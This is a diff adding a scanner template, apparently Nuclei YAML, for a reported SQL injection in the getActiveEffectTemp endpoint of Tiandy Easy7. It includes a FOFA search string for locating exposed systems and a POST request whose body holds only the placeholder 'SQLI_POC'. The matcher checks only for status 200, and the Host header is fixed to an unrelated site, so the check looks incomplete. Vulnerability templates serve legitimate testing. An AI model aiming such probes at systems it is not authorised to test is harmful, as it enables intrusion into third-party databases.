@@ -1,0 +1,26 @@
+id: poc-gvk63dug5moygtb3
+info:
+  name: 天地伟业Easy7 getActiveEffectTemp 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gvk63dug5moygtb3'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gvk63dug5moygtb3
+    fofa: app="Tiandy-Easy7"
+http:
+- raw:
+  - 'POST /Easy7/rest/obj/getActiveEffectTemp HTTP/1.1
+
+    Host:www.hacktwohub.com
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    id=SQLI_POC'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
